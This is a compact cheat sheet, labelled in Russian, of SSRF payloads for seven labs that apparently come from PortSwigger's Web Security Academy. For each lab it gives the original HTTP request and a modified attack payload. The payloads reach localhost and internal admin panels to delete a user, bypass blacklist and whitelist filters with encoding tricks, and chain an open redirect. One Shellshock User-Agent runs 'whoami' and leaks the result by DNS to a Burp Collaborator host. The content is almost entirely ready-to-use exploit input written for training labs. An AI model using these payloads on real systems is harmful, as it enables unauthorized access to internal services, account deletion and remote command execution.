SSRF

1. Basic SSRF against the local server
 * Было (Original):
   POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1

 * Стало (Payload для получения админки):
   stockApi=http://localhost/admin

 * Стало (Payload для удаления carlos):
   stockApi=http://localhost/admin/delete?username=carlos

2. Basic SSRF against another back-end system
 * Было (Original):
   POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1

 * Стало (Payload для брутфорса IP в Intruder):
   stockApi=http://192.168.0.§1§:8080/admin

 * Стало (Payload для удаления carlos, например IP оказался 192.168.0.183):
   stockApi=http://192.168.0.183:8080/admin/delete?username=carlos

3. Blind SSRF with out-of-band detection
 * Было (Original):
   GET /product?productId=1 HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 ...
Referer: https://vulnerable-website.com/

 * Стало (Payload):
   Referer: http://YOUR-SUBDOMAIN.burpcollaborator.net

4. SSRF with blacklist-based input filter
 * Было (Original):
   stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1

 * Стало (Payload — замена 127.0.0.1 на 127.1 и двойной URL encode буквы a в admin -> %2561):
   stockApi=http://127.1/%2561dmin/delete?username=carlos

5. SSRF with filter bypass via open redirection vulnerability
 * Было (Original):
   stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1

 * Стало (Payload — использование эндпоинта редиректа /product/nextProduct?path=...):
   stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

6. Blind SSRF with Shellshock exploitation
 * Было (Original):
   POST /product/stock HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...

stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1

 * Стало (Payload — меняются сразу два места: User-Agent и stockApi):
   POST /product/stock HTTP/1.1
Host: vulnerable-website.com
User-Agent: () { :;}; /bin/nslookup $(whoami).YOUR-SUBDOMAIN.burpcollaborator.net

stockApi=http://192.168.0.X:8080/

7. SSRF with whitelist-based input filter
 * Было (Original):
   stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1

 * Стало (Payload — обход через @ и двойное закодированное # -> %23):
   stockApi=http://localhost%23@stock.welikeshop.net/admin/delete?username=carlos
